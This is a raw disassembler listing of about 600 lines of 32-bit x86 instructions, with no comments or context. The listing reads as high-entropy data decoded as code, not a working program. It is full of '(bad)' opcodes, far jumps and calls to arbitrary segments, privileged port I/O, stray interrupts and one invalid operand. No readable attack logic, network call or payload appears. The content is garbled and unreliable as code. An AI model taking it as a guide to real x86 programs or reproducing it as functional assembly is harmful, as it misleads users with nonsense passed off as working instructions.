  43ca54:	mov    al,0xe0
  43ca56:	lock push cs
  43ca58:	mov    edx,0x3fe614f
  43ca5d:	popa   
  43ca5e:	adc    al,0x8
  43ca60:	sub    dl,dl
  43ca62:	inc    esi
  43ca63:	sar    BYTE PTR [ebx+0x74226803],1
  43ca69:	shr    BYTE PTR [edi+0x1c],cl
  43ca6c:	fwait
  43ca6d:	scas   al,BYTE PTR es:[edi]
  43ca6e:	fbld   TBYTE PTR [eax]
  43ca70:	xor    BYTE PTR ds:[eax],0xc9
  43ca74:	cli    
  43ca75:	rol    BYTE PTR [ecx-0x7aea1cce],1
  43ca7b:	adc    eax,0xcf538a6
  43ca80:	pop    eax
  43ca81:	fbld   TBYTE PTR [eax+0x4c2fb689]
  43ca87:	mul    BYTE PTR [edx]
  43ca89:	ret    0x896
  43ca8c:	jl     0x43ca31
  43ca8e:	add    eax,0x5aa92281
  43ca93:	jmp    0x43ca2d
  43ca95:	inc    ebx
  43ca96:	aam    0xd3
  43ca98:	cmp    BYTE PTR [ebx-0x25],dl
  43ca9b:	xor    dl,BYTE PTR [edx-0x44]
  43ca9e:	rcl    BYTE PTR [ecx+edx*2-0xda9ebe9],1
  43caa5:	cmp    ebx,DWORD PTR [ebx-0x6]
  43caa8:	jnp    0x43caeb
  43caaa:	cmp    eax,DWORD PTR [eax+0x66]
  43caad:	inc    esi
  43caae:	mov    ds:0xd5057d69,eax
  43cab3:	lea    ebp,[edi]
  43cab5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cab7:	mov    al,ds:0x3f120612
  43cabc:	add    eax,esp
  43cabe:	add    BYTE PTR [edx-0x56],0x8a
  43cac2:	je     0x43ca67
  43cac4:	aad    0x8c
  43cac6:	inc    ebx
  43cac7:	mov    ah,0x21
  43cac9:	mov    ds:0xd1d69a49,al
  43cace:	mov    esi,ss
  43cad0:	xor    DWORD PTR [edx+esi*4-0x70],ecx
  43cad4:	mov    ds:0xa809f40d,al
  43cad9:	mov    DWORD PTR [esi+0x3993ce74],0xb582be6d
  43cae3:	(bad)  
  43cae4:	(bad)  
  43cae5:	shr    BYTE PTR [edx],0x94
  43cae8:	push   cs
  43cae9:	xor    al,0x52
  43caeb:	sub    al,BYTE PTR [ecx]
  43caed:	dec    ebx
  43caee:	push   edx
  43caef:	mov    ah,0xaa
  43caf1:	and    al,0xb6
  43caf3:	mov    cl,BYTE PTR [edx+0x4c369443]
  43caf9:	mov    ecx,0x9f46e672
  43cafe:	dec    ebp
  43caff:	ins    DWORD PTR es:[edi],dx
  43cb00:	iret   
  43cb01:	pop    eax
  43cb02:	daa    
  43cb03:	call   0x9752:0xd62cc6d8
  43cb0a:	sub    ebx,ebx
  43cb0c:	or     al,0x20
  43cb0e:	push   0x41
  43cb10:	ficom  DWORD PTR [edx+0x5c]
  43cb13:	mov    ch,BYTE PTR [eax]
  43cb15:	or     BYTE PTR ds:0x354e5ca2,cl
  43cb1b:	mov    DWORD PTR [ecx],ebp
  43cb1d:	sub    BYTE PTR [eax+0xb566acc],cl
  43cb23:	aas    
  43cb24:	lods   al,BYTE PTR ds:[esi]
  43cb25:	lods   eax,DWORD PTR ds:[esi]
  43cb26:	jl     0x43cb01
  43cb28:	out    dx,al
  43cb29:	je     0x43cad9
  43cb2b:	xchg   esp,eax
  43cb2c:	dec    esi
  43cb2d:	inc    esp
  43cb2e:	mov    ds:0xba4faf55,al
  43cb33:	(bad)  
  43cb34:	push   cs
  43cb35:	add    ah,al
  43cb37:	mov    ebp,DWORD PTR [edx-0x19f2798]
  43cb3d:	outs   dx,DWORD PTR ds:[esi]
  43cb3e:	add    ch,dh
  43cb40:	push   0x0
  43cb42:	out    dx,al
  43cb43:	ss dec ah
  43cb46:	lds    ebx,FWORD PTR [ebx+ecx*1-0x6c]
  43cb4a:	ss jl  0x43cb27
  43cb4d:	mov    dl,0xac
  43cb4f:	inc    esp
  43cb50:	pop    esp
  43cb51:	fst    DWORD PTR [eax]
  43cb53:	inc    esi
  43cb54:	adc    DWORD PTR [edi],edx
  43cb56:	test   al,0xed
  43cb58:	mov    dl,al
  43cb5a:	add    DWORD PTR [eax+0x56942406],esp
  43cb60:	mov    DWORD PTR [ecx+0x6a],ecx
  43cb63:	shl    DWORD PTR [esi+ecx*2],cl
  43cb66:	jo     0x43cb21
  43cb68:	adc    esp,ecx
  43cb6a:	and    eax,0x86f8421d
  43cb6f:	in     eax,0x72
  43cb71:	adc    bh,BYTE PTR [ecx-0x3e579faf]
  43cb77:	inc    esp
  43cb78:	pop    esp
  43cb79:	xchg   edi,eax
  43cb7a:	push   esi
  43cb7b:	(bad)  
  43cb7c:	(bad)  
  43cb7d:	cmp    esp,DWORD PTR [ebp-0x615f55e9]
  43cb83:	loopne 0x43cb85
  43cb85:	jb     0xc248e59a
  43cb8b:	out    dx,eax
  43cb8c:	mov    dl,0x8c
  43cb8e:	add    BYTE PTR [ebp-0xb],ch
  43cb91:	or     edx,edx
  43cb93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cb94:	and    ah,ah
  43cb96:	fcmovnbe st,st(0)
  43cb98:	jns    0x43cbe7
  43cb9a:	scas   al,BYTE PTR es:[edi]
  43cb9b:	adc    edx,eax
  43cb9d:	mov    es,WORD PTR [eax+edx*1+0x24]
  43cba1:	jbe    0x43cbd1
  43cba3:	in     al,0x54
  43cba5:	mov    BYTE PTR [ebp+0x35],ch
  43cba8:	fs sub edx,esp
  43cbab:	jl     0x43cc0f
  43cbad:	shl    DWORD PTR [ecx+0x55],1
  43cbb0:	adc    al,0x9c
  43cbb2:	cmp    al,0x4c
  43cbb4:	adc    bh,BYTE PTR [edx+eax*2+0x3e]
  43cbb8:	sub    DWORD PTR [ebp-0x5e05595e],edi
  43cbbe:	pushf  
  43cbbf:	addr16 add al,0xa1
  43cbc2:	mov    dh,dl
  43cbc4:	fsub   QWORD PTR [eax-0x4e]
  43cbc7:	aaa    
  43cbc8:	and    BYTE PTR [ecx+0x2a],0x56
  43cbcc:	sbb    DWORD PTR [edx],ebp
  43cbce:	scas   al,BYTE PTR es:[edi]
  43cbcf:	push   es
  43cbd0:	sub    DWORD PTR [edx-0x3a],0x16
  43cbd4:	jge    0x43cc21
  43cbd6:	pop    eax
  43cbd7:	inc    eax
  43cbd8:	xchg   BYTE PTR [ebx-0x48],ah
  43cbdb:	jnp    0x43cbc3
  43cbdd:	loop   0x43cbbf
  43cbdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cbe0:	mov    al,ds:0x3702a2c7
  43cbe5:	call   0x5eec:0xe0876f2
  43cbec:	mov    dl,0xbe
  43cbee:	jle    0x43cb7c
  43cbf0:	in     al,0xf6
  43cbf2:	fnstsw WORD PTR [esi]
  43cbf4:	fwait
  43cbf5:	enter  0x823a,0x90
  43cbf9:	add    DWORD PTR [eax+0x22],edi
  43cbfc:	lds    eax,FWORD PTR [ebx]
  43cbfe:	or     eax,0x820169fb
  43cc03:	into   
  43cc04:	je     0x43cbe8
  43cc06:	add    BYTE PTR [eax+0x48882816],bh
  43cc0c:	mov    cl,0x3a
  43cc0e:	adc    al,0x84
  43cc10:	int    0x8
  43cc12:	sub    al,dl
  43cc14:	mov    al,0x3a
  43cc16:	int3   
  43cc17:	fldcw  WORD PTR [eax+0x5]
  43cc1a:	push   es
  43cc1b:	scas   al,BYTE PTR es:[edi]
  43cc1c:	jl     0x43cc6f
  43cc1e:	data16 jge 0x43cbfd
  43cc21:	lods   eax,DWORD PTR ds:[esi]
  43cc22:	lahf   
  43cc23:	nop
  43cc24:	ds dec eax
  43cc26:	or     al,0x63
  43cc28:	mov    edx,DWORD PTR [esi-0x7]
  43cc2b:	sbb    eax,0x5bb4681f
  43cc30:	loop   0x43cc3e
  43cc32:	jle    0x43cc5b
  43cc34:	(bad)  
  43cc35:	pop    edx
  43cc36:	call   FWORD PTR [ebx]
  43cc38:	push   ds
  43cc39:	and    BYTE PTR [esp+ecx*8],dh
  43cc3c:	adc    dh,dl
  43cc3e:	jp     0x43cc31
  43cc40:	ss fcmovb st,st(4)
  43cc43:	dec    edi
  43cc44:	adc    esi,edx
  43cc46:	shl    ecx,1
  43cc48:	push   sp
  43cc4a:	sub    esi,edi
  43cc4c:	mov    ebp,gs
  43cc4e:	loop   0x43cc50
  43cc50:	dec    eax
  43cc51:	pusha  
  43cc52:	lods   al,BYTE PTR ds:[esi]
  43cc53:	in     al,0x55
  43cc55:	nop
  43cc56:	xchg   ebp,eax
  43cc57:	jmp    0x43cc7c
  43cc59:	test   ebp,edx
  43cc5b:	scas   al,BYTE PTR es:[edi]
  43cc5c:	aad    0xfb
  43cc5e:	stos   BYTE PTR es:[edi],al
  43cc5f:	pushf  
  43cc60:	rcr    dl,1
  43cc62:	int    0x54
  43cc64:	xchg   ebp,eax
  43cc65:	and    ch,BYTE PTR [ecx]
  43cc67:	add    BYTE PTR [eax-0x57fbbb1e],bl
  43cc6d:	add    al,0xa0
  43cc6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cc70:	push   ecx
  43cc71:	mov    ds:0x80967ec2,al
  43cc76:	scas   al,BYTE PTR es:[edi]
  43cc77:	data16 fsubr DWORD PTR [esi]
  43cc7a:	es mov al,0xf2
  43cc7d:	push   ss
  43cc7e:	cwde   
  43cc7f:	dec    esp
  43cc80:	hlt    
  43cc81:	mov    ebp,0x3dee652
  43cc86:	push   ecx
  43cc87:	outs   dx,BYTE PTR ds:[esi]
  43cc88:	jmp    0xbed7cd15
  43cc8d:	inc    edx
  43cc8e:	stos   DWORD PTR es:[edi],eax
  43cc8f:	add    dl,BYTE PTR [eax-0x1ce4a793]
  43cc95:	push   edx
  43cc96:	jb     0x43cc7f
  43cc98:	ds add eax,eax
  43cc9b:	dec    ebx
  43cc9c:	data16 sti 
  43cc9e:	cmp    esi,DWORD PTR [ebx+ebx*2+0x3a]
  43cca2:	bound  edx,QWORD PTR [eax]
  43cca4:	(bad)  
  43cca5:	nop
  43cca6:	mov    dh,dh
  43cca8:	pop    eax
  43cca9:	fiadd  DWORD PTR [ecx+0x45721d8c]
  43ccaf:	fld    TBYTE PTR [esi+0x7]
  43ccb2:	loop   0x43cd09
  43ccb4:	adc    DWORD PTR [eax-0x75],ebp
  43ccb7:	sub    al,BYTE PTR [esp+ebx*8]
  43ccba:	and    ah,0xf4
  43ccbd:	add    al,0x49
  43ccbf:	mov    cl,0x40
  43ccc1:	sub    DWORD PTR [eax+ebp*2],edi
  43ccc4:	push   ebp
  43ccc5:	shl    ah,cl
  43ccc7:	inc    ecx
  43ccc8:	imul   edi,DWORD PTR [eax-0x37],0x38
  43cccc:	xor    al,0x38
  43ccce:	outs   dx,BYTE PTR ds:[esi]
  43cccf:	add    bh,0x80
  43ccd2:	jle    0x43cd1e
  43ccd4:	enter  0x4cc8,0xfe
  43ccd8:	push   edx
  43ccd9:	data16 fwait
  43ccdb:	ins    DWORD PTR es:[edi],dx
  43ccdc:	or     eax,0xe1caac1a
  43cce1:	mov    eax,0x33b8761c
  43cce6:	cs push ss
  43cce8:	pop    esp
  43cce9:	lock inc edx
  43cceb:	(bad)  
  43ccec:	in     eax,dx
  43cced:	mov    dl,0x46
  43ccef:	imul   ebp,ebp,0xc00030c
  43ccf5:	stos   DWORD PTR es:[edi],eax
  43ccf6:	push   0x38c7df30
  43ccfb:	add    BYTE PTR [ecx-0x6b540754],bh
  43cd01:	aad    0x5e
  43cd03:	add    BYTE PTR [eax+0x61],bh
  43cd06:	imul   eax,DWORD PTR [eax+0x2b],0xe1564ca4
  43cd0d:	rol    al,0x5f
  43cd10:	or     bh,BYTE PTR [esi+0x1c2d0054]
  43cd16:	pushf  
  43cd17:	add    edx,DWORD PTR [esi+0x74]
  43cd1a:	sbb    BYTE PTR [eax+0x24],ah
  43cd1d:	mov    ah,0xea
  43cd1f:	mov    esi,0xa4010fd3
  43cd24:	xchg   DWORD PTR [eax],edx
  43cd26:	push   ds
  43cd27:	call   0xc16c:0x3ada285a
  43cd2e:	sub    esp,DWORD PTR [eax+0x4b]
  43cd31:	les    ebx,FWORD PTR [eax-0x76]
  43cd34:	push   ds
  43cd35:	xchg   esp,eax
  43cd36:	faddp  st(7),st
  43cd38:	pop    es
  43cd39:	adc    BYTE PTR [esi-0x65],bl
  43cd3c:	retf   0xc57a
  43cd3f:	dec    edx
  43cd40:	mov    al,0xc0
  43cd42:	mov    bh,0xa4
  43cd44:	add    eax,0xb422d75a
  43cd49:	xor    al,BYTE PTR [edi+0x12]
  43cd4c:	cmp    edx,DWORD PTR [ecx]
  43cd4e:	ror    edx,0xbf
  43cd51:	sahf   
  43cd52:	shr    BYTE PTR [edx+0x4d],1
  43cd55:	aad    0xf1
  43cd57:	xchg   ecx,eax
  43cd58:	xor    BYTE PTR [esi+eax*4],bh
  43cd5b:	cmp    BYTE PTR [ecx+0x56],0x7b
  43cd5f:	adc    al,0x5e
  43cd61:	jbe    0x43cd95
  43cd63:	jle    0x43cd8d
  43cd65:	ins    BYTE PTR es:[edi],dx
  43cd66:	inc    eax
  43cd67:	jo     0x43cd44
  43cd69:	in     al,0x30
  43cd6b:	fadd   QWORD PTR [esi+ecx*8]
  43cd6e:	hlt    
  43cd6f:	push   esp
  43cd70:	mov    al,ds:0xa6b54034
  43cd75:	sub    bl,BYTE PTR [eax]
  43cd77:	imul   eax,DWORD PTR [eax+0x72],0xb2023082
  43cd7e:	push   0xffffffc0
  43cd80:	rol    BYTE PTR [edi+ebp*1+0x2cd0d48e],1
  43cd87:	xor    BYTE PTR [edx+eiz*4+0x6edcd849],cl
  43cd8e:	daa    
  43cd8f:	test   eax,0x2cb0b8d9
  43cd94:	adc    dl,BYTE PTR [eax]
  43cd96:	aaa    
  43cd97:	or     DWORD PTR [edx+0x537a64f6],0x90b22010
  43cda1:	ror    DWORD PTR [edi+edx*2+0x7],1
  43cda5:	xor    al,0x71
  43cda7:	xor    dh,BYTE PTR [esi-0x6c]
  43cdaa:	shr    BYTE PTR [ebx+edx*4],cl
  43cdad:	gs mov ah,0x2a
  43cdb0:	inc    esp
  43cdb1:	mov    al,ds:0x9c42b4a1
  43cdb6:	pop    eax
  43cdb7:	pop    edx
  43cdb8:	cmp    esi,DWORD PTR [ebx+ecx*1]
  43cdbb:	jle    0x43cd80
  43cdbd:	pop    eax
  43cdbe:	test   al,0x8d
  43cdc0:	mov    eax,0xc60aa67e
  43cdc5:	std    
  43cdc6:	add    BYTE PTR [edx],cl
  43cdc8:	or     ebx,DWORD PTR [edx-0x5f383034]
  43cdce:	or     ah,BYTE PTR [esp+edx*4]
  43cdd1:	jmp    0xa75e:0x6bc09bf6
  43cdd8:	xchg   esi,eax
  43cdd9:	sub    BYTE PTR ds:0xd6c6a045,0xe
  43cde0:	mov    BYTE PTR [edi-0x10299c10],bl
  43cde6:	mov    al,ds:0xa329b7be
  43cdeb:	loope  0x43cdad
  43cded:	pusha  
  43cdee:	repz in al,dx
  43cdf0:	and    al,0xb7
  43cdf2:	test   al,0xb6
  43cdf4:	shl    DWORD PTR [edx+0x2c],0x91
  43cdf8:	sub    eax,0x9a4aba2e
  43cdfd:	cmc    
  43cdfe:	add    ebx,esp
  43ce00:	data16 sub BYTE PTR [esi],dh
  43ce03:	frstor [eax+ebx*8+0x21f82c69]
  43ce0a:	cwde   
  43ce0b:	adc    DWORD PTR [ebp+0x6b42bf00],ebx
  43ce11:	lea    ecx,[edx+0x50af59d6]
  43ce17:	mov    al,0x8a
  43ce19:	push   eax
  43ce1a:	icebp  
  43ce1b:	xchg   esi,eax
  43ce1c:	aam    0xb1
  43ce1e:	mov    ah,0xbb
  43ce20:	xor    DWORD PTR [esi+0x6b],edi
  43ce23:	lock xchg esp,eax
  43ce25:	pop    esp
  43ce26:	mov    es,WORD PTR [esi]
  43ce28:	xor    eax,0xb0149fe6
  43ce2d:	sub    dh,BYTE PTR [edx+0x5c744432]
  43ce33:	loope  0x43ce58
  43ce35:	test   eax,0xc1d2828e
  43ce3a:	out    dx,al
  43ce3b:	or     cl,BYTE PTR [ebp-0x2c]
  43ce3e:	inc    edi
  43ce3f:	sbb    DWORD PTR [ebp-0x4b1d7ba4],ebp
  43ce45:	push   0x83ec06be
  43ce4a:	cmc    
  43ce4b:	dec    edx
  43ce4c:	mov    dh,0x99
  43ce4e:	cmp    eax,0x5898b58a
  43ce53:	daa    
  43ce54:	inc    ebx
  43ce55:	lea    esp,[eax]
  43ce57:	mov    BYTE PTR [edi-0x40],dh
  43ce5a:	lock add dl,dl
  43ce5d:	stos   BYTE PTR es:[edi],al
  43ce5e:	sahf   
  43ce5f:	push   ds
  43ce60:	add    BYTE PTR [esi+ebp*1+0x22],0x66
  43ce65:	mov    eax,ds:0xde30cf15
  43ce6a:	add    eax,0x97f00ea0
  43ce6f:	xchg   BYTE PTR [esi],bl
  43ce71:	mov    edi,0x42893eb2
  43ce76:	mov    dl,0xdc
  43ce78:	sbb    ebx,DWORD PTR [esi+0x4a96058c]
  43ce7e:	std    
  43ce7f:	jmp    0x4241:0x41c36863
  43ce86:	xor    DWORD PTR [esp+ebp*1-0x42],ebx
  43ce8a:	xlat   BYTE PTR ds:[ebx]
  43ce8b:	call   0x2035:0x72f417ea
  43ce92:	mov    edx,0xeeb4bc4a
  43ce97:	int    0xd6
  43ce99:	arpl   WORD PTR [eax+0x2b],bx
  43ce9c:	sbb    al,0xce
  43ce9e:	iret   
  43ce9f:	jp     0x43ce37
  43cea1:	pop    eax
  43cea2:	inc    ebx
  43cea3:	mov    ds:0xdae4c9ed,eax
  43cea8:	mov    ?,ebx
  43ceaa:	loopne 0x43ced8
  43ceac:	cmp    eax,0xec47daa4
  43ceb1:	mov    cs,esp
  43ceb3:	adc    BYTE PTR [eax],dh
  43ceb5:	dec    esi
  43ceb6:	xchg   ebx,eax
  43ceb7:	mov    ebx,0x2c8e8225
  43cebc:	push   ds
  43cebd:	jmp    0xd250:0x5893e0fc
  43cec4:	dec    ecx
  43cec5:	jmp    0xaf66:0x7b2234f0
  43cecc:	dec    eax
  43cecd:	jne    0x43ced3
  43cecf:	dec    edi
  43ced0:	loop   0x43cf36
  43ced2:	mov    es,esp
  43ced4:	out    dx,al
  43ced5:	jle    0x43cebf
  43ced7:	mov    cl,0xda
  43ced9:	aas    
  43ceda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cedb:	hlt    
  43cedc:	dec    ebx
  43cedd:	push   esp
  43cede:	cmp    BYTE PTR [ebp-0x46],0x33
  43cee2:	aam    0x38
  43cee4:	ss push ebp
  43cee6:	or     BYTE PTR [edx+eiz*1+0x1752b28b],bl
  43ceed:	inc    edx
  43ceee:	jmp    0xf6aa5328
  43cef3:	retf   
  43cef4:	push   ds
  43cef5:	(bad)  
  43cef6:	lods   eax,DWORD PTR ds:[esi]
  43cef7:	cmp    bl,cl
  43cef9:	jp     0x43cf00
  43cefb:	jl     0x43cf13
  43cefd:	add    BYTE PTR [ebp+ebp*4+0x5661480a],dh
  43cf04:	push   0xffffffc8
  43cf06:	leave  
  43cf07:	test   al,0x11
  43cf09:	rcl    BYTE PTR [ebx+0x2b2c5d4e],1
  43cf0f:	xchg   BYTE PTR [esi],cl
  43cf11:	cli    
  43cf12:	inc    ecx
  43cf13:	and    dx,WORD PTR [esi]
  43cf16:	xchg   edx,eax
  43cf17:	and    al,0xc
  43cf19:	dec    eax
  43cf1a:	in     al,dx
  43cf1b:	loop   0x43ceab
  43cf1d:	scas   eax,DWORD PTR es:[edi]
  43cf1e:	cwde   
  43cf1f:	inc    ecx
  43cf20:	jmp    0x43cec6
  43cf22:	push   ecx
  43cf23:	int3   
  43cf24:	cmp    al,0x80
  43cf26:	jmp    0x183feee9
  43cf2b:	push   esp
  43cf2c:	add    ebp,DWORD PTR [ecx]
  43cf2e:	cmp    dl,BYTE PTR ss:[esi-0x709ea5fc]
  43cf35:	lods   al,BYTE PTR ds:[esi]
  43cf36:	pushf  
  43cf37:	jb     0x43cf0f
  43cf39:	in     al,0xbe
  43cf3b:	cli    
  43cf3c:	sbb    cl,BYTE PTR [edx-0x4977d1af]
  43cf42:	mov    ds:0xdeec1e94,eax
  43cf47:	adc    DWORD PTR [edx+0x4a846a5d],edi
  43cf4d:	sub    DWORD PTR [ebx+0x4bc4da0],edi
  43cf53:	cmc    
  43cf54:	cmp    bh,BYTE PTR [eax]
  43cf56:	push   eax
  43cf57:	sahf   
  43cf58:	mov    WORD PTR [edi],ss
  43cf5a:	retf   0xdb44
  43cf5d:	scas   al,BYTE PTR es:[edi]
  43cf5e:	mov    esp,0x6443cada
  43cf63:	mov    eax,0x101fb084
  43cf68:	lock les eax,FWORD PTR [ecx+0x21a02aa1]
  43cf6f:	and    dl,BYTE PTR [ecx]
  43cf71:	inc    esi
  43cf72:	leave  
  43cf73:	ins    BYTE PTR es:[edi],dx
  43cf74:	ds push edi
  43cf76:	dec    edi
  43cf77:	js     0x43cf96
  43cf79:	adc    esi,DWORD PTR es:[eax+eiz*1-0x4b]
  43cf7e:	faddp  st(4),st
  43cf80:	cwde   
  43cf81:	mov    ah,0x70
  43cf83:	mov    al,0xe
  43cf85:	or     ecx,ebp
  43cf87:	add    BYTE PTR [ecx],ch
  43cf89:	mov    eax,0xa4d01ce6
  43cf8e:	dec    edi
  43cf8f:	sbb    DWORD PTR [eax],edi
  43cf91:	inc    edx
  43cf92:	mov    ah,0xb2
  43cf94:	repz xlat BYTE PTR ds:[ebx]
  43cf96:	nop
  43cf97:	pop    edx
  43cf98:	xor    eax,0xfe70f608
  43cf9d:	adc    al,0x6b
  43cf9f:	rcl    DWORD PTR ds:0xe2ab8050,1
  43cfa5:	or     dh,bh
  43cfa7:	imul   edi,eax,0xffffff84
  43cfaa:	ds push 0xfc200f43
  43cfb0:	push   esi
  43cfb1:	into   
  43cfb2:	dec    edx
  43cfb3:	mov    ah,0x7d
  43cfb5:	xor    BYTE PTR [ecx-0x40fc2139],al
  43cfbb:	xor    al,0x94
  43cfbd:	mov    ecx,edx
  43cfbf:	rol    BYTE PTR [ebx-0x56],0x10
  43cfc3:	inc    esp
  43cfc4:	xor    BYTE PTR ss:[eax],ah
  43cfc7:	adc    DWORD PTR [edx-0x75d782f8],edi
  43cfcd:	xor    BYTE PTR [edx],0x36
  43cfd0:	inc    ecx
  43cfd1:	push   esp
  43cfd2:	and    eax,DWORD PTR [eax+0x50658c72]
  43cfd8:	push   ebp
  43cfd9:	xchg   DWORD PTR [esi],edx
  43cfdb:	scas   al,BYTE PTR es:[edi]
  43cfdc:	gs jb  0x43d011
  43cfdf:	je     0x43cf61
  43cfe1:	xchg   edi,eax
  43cfe2:	inc    esp
  43cfe3:	mov    ch,0xfe
  43cfe5:	push   0x14
  43cfe7:	mov    ds:0xbb6d5be1,al
  43cfec:	mov    al,ds:0x2d644b3e
  43cff1:	lds    esi,FWORD PTR [edx-0x49dd4424]
  43cff7:	imul   eax,esi,0xffffffdf
  43cffa:	fs (bad) 
  43cffc:	mov    bl,0xc0
  43cffe:	(bad)  
  43cfff:	sub    BYTE PTR [edx+0x7a],cl
  43d002:	gs pusha 
  43d004:	in     al,dx
  43d005:	and    esp,DWORD PTR [esi+0x61]
  43d008:	jecxz  0x43d052
  43d00a:	push   edi
  43d00b:	nop
  43d00c:	jle    0x43cffc
  43d00e:	dec    edi
  43d00f:	pop    edx
  43d010:	or     dl,BYTE PTR [eax+0x42]
  43d013:	aas    
  43d014:	dec    ebp
  43d015:	push   esp
  43d016:	call   0xc561d2ec
  43d01b:	push   esp
  43d01c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d01d:	mov    WORD PTR [edi],fs
  43d01f:	sbb    al,0xd2
  43d021:	sub    BYTE PTR [edi*8-0x6fb60b6e],0xd
  43d029:	or     DWORD PTR [edx+0x36],ecx
  43d02c:	dec    ecx
  43d02d:	mov    ah,BYTE PTR [ebx]
  43d02f:	adc    BYTE PTR [ebp+0x769a0188],ch
  43d035:	mov    bl,BYTE PTR ss:[eax-0x5e]
  43d039:	xchg   ebp,eax
  43d03a:	lods   al,BYTE PTR ds:[esi]
  43d03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d03c:	data16 add al,0xff
  43d03f:	pop    ss
  43d040:	mov    al,0x6e
  43d042:	stos   BYTE PTR es:[edi],al
  43d043:	shr    DWORD PTR [eax],0xc6
  43d046:	bound  edi,QWORD PTR [ecx]
  43d048:	mov    al,0x6c
  43d04a:	sbb    DWORD PTR es:0x3a8aa034,edx
  43d051:	adc    DWORD PTR [ecx-0x58],esp
  43d054:	push   es
  43d055:	cmc    
  43d056:	or     al,0x94
  43d058:	cmp    eax,DWORD PTR [eax+edi*4]
  43d05b:	lahf   
  43d05c:	inc    eax
  43d05d:	mov    ah,0x1f
  43d05f:	mov    eax,0xbf586d49
  43d064:	xor    BYTE PTR es:[esi+0x4f],dh
  43d068:	add    al,0x7e
  43d06a:	dec    ebx
  43d06b:	push   ds
  43d06c:	mov    al,0xf0
  43d06e:	sbb    al,ah
  43d070:	add    eax,0xcfa09e94
  43d075:	es dec esp
  43d077:	(bad)  
  43d078:	mov    esi,0x4d012fb6
  43d07d:	hlt    
  43d07e:	sti    
  43d07f:	mov    es,WORD PTR [ecx]
  43d081:	cli    
  43d082:	repnz cli 
  43d084:	xchg   BYTE PTR [ebp-0x46],ch
  43d087:	nop
  43d088:	adc    BYTE PTR [ebx-0x7d104054],ah
  43d08e:	inc    ebp
  43d08f:	pusha  
  43d090:	xchg   DWORD PTR [eax+0x22fed8b2],eax
  43d096:	push   ss
  43d097:	jle    0x43d0a4
  43d099:	js     0x43d06b
  43d09b:	or     esp,ecx
  43d09d:	push   0xe8666726
  43d0a2:	xchg   edx,eax
  43d0a3:	pop    esi
  43d0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d0a5:	loopne 0x43d04f
  43d0a7:	ret    0x348c
  43d0aa:	push   esp
  43d0ab:	cmp    al,0xb
  43d0ad:	int3   
  43d0ae:	in     al,dx
  43d0af:	shl    BYTE PTR [ecx-0xe],cl
  43d0b2:	(bad)  
  43d0b3:	pop    ss
  43d0b4:	aam    0xd0
  43d0b6:	pusha  
  43d0b7:	retf   0xb035
  43d0ba:	push   ss
  43d0bb:	in     al,0x5b
  43d0bd:	icebp  
  43d0be:	add    al,0xe3
  43d0c0:	dec    edi
  43d0c1:	jo     0x43d099
  43d0c3:	int    0x40
  43d0c5:	repz and edi,DWORD PTR [edx]
  43d0c8:	push   0xc1521fb3
  43d0cd:	pop    edx
  43d0ce:	int3   
  43d0cf:	jb     0x43d05f
  43d0d1:	loop   0x43d085
  43d0d3:	mov    ss:0xd4968565,al
  43d0d9:	(bad)  
  43d0da:	pop    ebp
  43d0db:	mov    esi,0xe050da83
  43d0e0:	outs   dx,BYTE PTR ds:[esi]
  43d0e1:	mov    edx,0x546fec53
  43d0e6:	mov    eax,ds:0x5e5e221f
  43d0eb:	clc    
  43d0ec:	push   ebx
  43d0ed:	ins    BYTE PTR es:[edi],dx
  43d0ee:	leave  
  43d0ef:	cmp    DWORD PTR [eax+0x5e8f082f],eax
  43d0f5:	(bad)  [ebp+0x40]
  43d0f8:	dec    ebx
  43d0f9:	or     DWORD PTR [edi+0x14],ebx
  43d0fc:	jo     0x43d114
  43d0fe:	mov    ch,0xe4
  43d100:	test   eax,0x22051962
  43d105:	push   ds
  43d106:	dec    eax
  43d107:	pop    esp
  43d108:	dec    edx
  43d109:	addr16 loop 0x43d0c3
  43d10c:	test   BYTE PTR [edx+ecx*8+0x2d382784],dl
  43d113:	push   0x7e
  43d115:	shl    edi,cl
  43d117:	les    eax,FWORD PTR [esi+0x67]
  43d11a:	add    BYTE PTR [esi+ecx*2+0x0],dh
  43d11e:	inc    esi
  43d11f:	jg     0x43d0e9
  43d121:	push   esp
  43d122:	jmp    0xa38a:0x208e1a2b
  43d129:	into   
  43d12a:	add    eax,0xcd401946
  43d12f:	jle    0x43d179
  43d131:	inc    ebp
  43d132:	into   
  43d133:	cli    
  43d134:	mov    edx,0xf4eecd28
  43d139:	jae    0x43d113
  43d13b:	add    al,0x8f
  43d13d:	or     DWORD PTR [ebx],0xc0cadf8c
  43d143:	add    al,0x9
  43d145:	fcom   DWORD PTR [eax+0x15]
  43d148:	aam    0x91
  43d14a:	lock ins BYTE PTR es:[edi],dx
  43d14c:	fcomp  QWORD PTR [edi]
  43d14e:	and    eax,0x4cfe666d
  43d153:	(bad)  
  43d155:	push   esp
  43d156:	jmp    DWORD PTR [edx+0x42781315]
  43d15c:	mov    esp,0xb089bb88
  43d161:	xor    eax,0xb22828b1
  43d166:	fsub   QWORD PTR [edx+0x5e26d7aa]
  43d16c:	in     al,0xf7
  43d16e:	loop   0x43d0f6
  43d170:	push   0xc26554e6
  43d175:	xchg   DWORD PTR [ebp-0x7faae5e4],eax
  43d17b:	cmp    ah,BYTE PTR [edx+ebp*8]
  43d17e:	and    BYTE PTR [edx],ah
  43d180:	(bad)  
  43d181:	outs   dx,BYTE PTR ds:[esi]
  43d182:	cld    
  43d183:	pusha  
  43d184:	sub    dl,BYTE PTR [eax]
  43d186:	fist   WORD PTR [esi]
  43d188:	sbb    ch,ch
  43d18a:	fdiv   QWORD PTR [ebx+eax*1]
  43d18d:	adc    eax,0xa09e5eae
  43d192:	or     DWORD PTR [edx],0x52
  43d195:	les    esi,FWORD PTR [esi+edi*4]
  43d198:	add    eax,0x70b872a4
  43d19d:	sub    eax,0x9d0a2b1b
  43d1a2:	out    dx,eax
  43d1a3:	je     0x43d1d1
  43d1a5:	aam    0x51
  43d1a7:	push   esp
  43d1a8:	aam    0xa4
  43d1aa:	mov    ds:0xcc261708,al
  43d1af:	inc    edx
